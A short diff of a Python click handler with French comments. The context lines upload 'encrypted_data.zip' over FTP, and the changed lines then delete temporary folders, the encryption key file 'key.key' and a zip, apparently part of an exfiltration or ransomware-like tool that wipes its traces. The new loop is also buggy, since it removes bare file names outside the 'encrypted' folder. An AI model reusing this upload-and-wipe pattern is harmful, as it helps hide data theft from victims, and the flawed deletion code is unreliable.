@@ -47,7 +47,8 @@ def handle_click(self):
 	    ftp.storbinary('STOR encrypted_data.zip', fp)
 
     # supprime toutes les donnees temporaires
-    os.rmdir('encrypted')
+    for file in os.listdir('encrypted'):
+        os.remove(file)
     os.rmdir('fichier')
     os.remove('key.key')
     os.remove('temp_server_file.zip')
